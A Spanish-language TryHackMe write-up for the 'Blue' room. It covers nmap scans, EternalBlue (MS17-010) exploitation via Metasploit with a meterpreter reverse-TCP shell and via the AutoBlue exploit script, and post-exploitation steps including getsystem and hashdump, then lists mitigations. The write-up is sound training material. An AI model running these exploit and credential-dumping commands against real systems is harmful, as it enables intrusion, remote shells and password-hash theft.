---
title: "Blue - TryHackMe"
description: "Writeup de Blue, una máquina Windows vulnerable a EternalBlue (MS17-010)."
pubDate: 2024-10-14
platform: "tryhackme"
category: "rooms"
difficulty: "easy"
os: "windows"
language: es
tags: ["eternalblue", "ms17-010", "smb", "exploit"]
retired: false
heroImage: "/images/writeups/tryhackme/blue.jpg"
attackVectors: ["network"]
techniques: ["T1210", "T1068"]
vulnerabilities: ["MS17-010", "CVE-2017-0143"]
certifications: ["OSCP", "CEH", "eJPT"]
skillLevel: "beginner"
estimatedTime: "30 minutos"
rating: 4
---

# Blue - TryHackMe Writeup

**Dificultad**: Easy  
**OS**: Windows  
**Plataforma**: TryHackMe

## Reconocimiento

```bash
nmap -sV -vv --script vuln 10.10.10.40
```

**Vulnerabilidad encontrada:**
- MS17-010 (EternalBlue)

## Enumeración SMB

```bash
nmap -p 445 --script=smb-vuln-ms17-010 10.10.10.40
```

El sistema es vulnerable a **EternalBlue**.

## Explotación

### Método 1: Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

### Método 2: AutoBlue

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
pip install -r requirements.txt

# Generar shellcode
cd shellcode
./shell_prep.sh

# Ejecutar exploit
cd ../
python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin
```

## Post-Explotación

Una vez dentro con Meterpreter:

```bash
# Obtener sistema
getsystem

# Hash dump
hashdump

# Migrar proceso
ps
migrate <PID>

# Buscar flags
search -f flag*.txt
```

**Ubicaciones de flags:**
- `C:\flag1.txt`
- `C:\Windows\System32\config\flag2.txt`
- `C:\Users\Jon\Documents\flag3.txt`

## Mitigación

1. Aplicar parche MS17-010
2. Deshabilitar SMBv1
3. Implementar segmentación de red
4. Mantener sistemas actualizados

## Conclusión

EternalBlue fue una de las vulnerabilidades más devastadoras, utilizada en ataques como WannaCry. Esta máquina enseña:

- Importancia de parches de seguridad
- Peligro de SMBv1
- Técnicas de post-explotación en Windows
